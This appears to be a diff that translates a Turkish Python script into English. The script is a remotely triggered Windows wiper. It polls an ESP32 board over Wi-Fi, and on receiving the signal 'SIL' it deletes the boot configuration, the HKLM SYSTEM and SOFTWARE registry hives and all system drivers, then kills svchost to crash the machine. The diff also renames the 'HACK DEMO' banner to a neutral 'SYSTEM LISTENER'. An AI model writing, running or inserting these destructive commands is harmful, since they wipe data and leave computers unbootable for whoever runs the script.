@@ -4,70 +4,70 @@ import time
 import ctypes
 
 # ============================================================
-# AYARLAR
+# SETTINGS
 # ============================================================
-# ESP32 AP modunda varsayılan IP genelde 192.168.4.1'dir
+# ESP32 in AP mode typically defaults to IP 192.168.4.1
 ESP32_IP  = "192.168.4.1"            
 ESP32_URL = f"http://{ESP32_IP}/durum"
 
-KONTROL_ARALIGI = 1
+CHECK_INTERVAL = 1
 # ============================================================
 
-def tam_imha():
+def total_destruction():
     print("\n" + "!"*50)
-    print("SİNYAL ALINDI: SİSTEM İMHA EDİLİYOR...")
+    print("SIGNAL RECEIVED: SYSTEM IS BEING DESTROYED...")
     print("!"*50)
     
-    # 1. Boot Verilerini Sil (BCD) - Açılışta "İşletim Sistemi Bulunamadı" hatası verdirir.
-    print("[*] Boot konfigürasyonu yok ediliyor...")
+    # 1. Delete Boot Data (BCD) - Shows "Operating System Not Found" on startup.
+    print("[*] Destroying boot configuration...")
     os.system("bcdedit /deleteall")
     
-    # 2. Kayıt Defterini (Registry) Sil - Windows'un beynini temizler.
-    print("[*] Kayıt defteri anahtarları siliniyor...")
+    # 2. Delete Registry (Registry) - Wipes Windows' brain.
+    print("[*] Deleting registry keys...")
     os.system(r'reg delete "HKEY_LOCAL_MACHINE\SYSTEM" /f')
     os.system(r'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE" /f')
     
-    # 3. Kritik Sürücüleri Temizle
-    print("[*] Sistem sürücüleri (drivers) siliniyor...")
+    # 3. Clean Critical Drivers
+    print("[*] Removing system drivers...")
     os.system(r"del /f /s /q C:\Windows\System32\drivers\*.sys")
 
-    # 4. Final: Sistemi Çökert ve Kapat
-    print("[*] Kritik süreç sonlandırılıyor...")
-    # Bu komut yönetici haklarıyla svchost'u öldürür ve BSOD (Mavi Ekran) tetikler.
+    # 4. Final Strike: Crash system and shutdown
+    print("[*] Terminating critical process...")
+    # This command kills svchost with admin rights and triggers BSOD (Blue Screen).
     os.system("taskkill /f /im svchost.exe")
 
 def main():
-    # WinError 5 almamak için yönetici kontrolü
+    # Admin check to avoid WinError 5
     if not ctypes.windll.shell32.IsUserAnAdmin():
         print("=" * 50)
-        print("[HATA] BU KODU LÜTFEN 'YÖNETİCİ OLARAK' ÇALIŞTIR!")
+        print("[ERROR] PLEASE RUN THIS CODE AS 'ADMINISTRATOR'!")
         print("=" * 50)
         return
 
     print("=" * 50)
-    print("  ESP32 HACK DEMO — AP MOD (WIFI) İMHA DİNLEYİCİ")
+    print("  ESP32-C6 — AP MODE (WIFI) SYSTEM LISTENER")
     print("=" * 50)
-    print(f"ESP32 Hedef : {ESP32_URL}")
-    print("[İPUCU] Bilgisayarın HACK_DEMO ağına bağlı olduğundan emin ol.")
-    print("\n[HAZIR] Sinyal bekleniyor... Sistem şu an güvende.\n")
+    print(f"ESP32 Target : {ESP32_URL}")
+    print("[TIP] Make sure your computer is connected to the HACK_DEMO network.")
+    print("\n[READY] Waiting for signal... System is currently safe.\n")
 
     while True:
         try:
             response = requests.get(ESP32_URL, timeout=2)
-            durum = response.text.strip().upper()
+            status = response.text.strip().upper()
 
-            if durum == "SIL":
-                tam_imha()
+            if status == "SIL":
+                total_destruction()
                 break
             else:
-                print(f"[...] Dinleniyor... ESP32 Yanıtı: '{durum}'", end="\r")
+                print(f"[...] Listening... ESP32 Response: '{status}'", end="\r")
 
         except requests.exceptions.ConnectionError:
-            print("[!] ESP32'ye bağlanılamıyor — Wi-Fi bağlantısını kontrol et!", end="\r")
+            print("[!] Cannot connect to ESP32 — check your Wi-Fi connection!", end="\r")
         except Exception as e:
-            print(f"[!] Hata oluştu: {e}                                     ", end="\r")
+            print(f"[!] Error occurred: {e}                                     ", end="\r")
 
-        time.sleep(KONTROL_ARALIGI)
+        time.sleep(CHECK_INTERVAL)
 
 if __name__ == "__main__":
     main()
